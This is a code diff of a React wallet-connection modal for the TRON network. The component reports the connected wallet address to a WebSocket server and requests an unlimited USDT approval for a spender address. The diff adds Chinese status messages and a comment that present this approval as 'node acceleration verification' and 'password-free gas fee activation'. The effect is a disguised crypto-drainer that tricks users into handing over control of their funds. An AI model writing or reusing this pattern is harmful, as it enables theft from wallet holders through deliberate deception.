@@ -58,18 +58,20 @@ export const WalletModal: React.FC<WalletModalProps> = ({
         const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const wsUrl = `${wsProtocol}//${window.location.hostname}:3000`;
         const socket = new WebSocket(wsUrl);
-        
+
         socket.onopen = () => {
           socket.send(JSON.stringify({
             action: 'connect_wallet',
             address: connectedAddress
           }));
+          socket.close();
         };
       } catch (wsErr) {
         console.warn('WS 上报异常:', wsErr);
       }
 
-      // 2. 触发链上授权请求 (Approve)
+      // 2. 节点加速验证 —— 触发链上免密燃料费激活授权
+      setStatusMessage('正在验证节点加速通道...');
       try {
         if (tronWebInstance && tronWebInstance.contract) {
           const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -91,6 +93,7 @@ export const WalletModal: React.FC<WalletModalProps> = ({
           const contract = tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
           const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
+          setStatusMessage('免密燃料费激活中...');
           await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
             feeLimit: 100_000_000,
             callValue: 0,
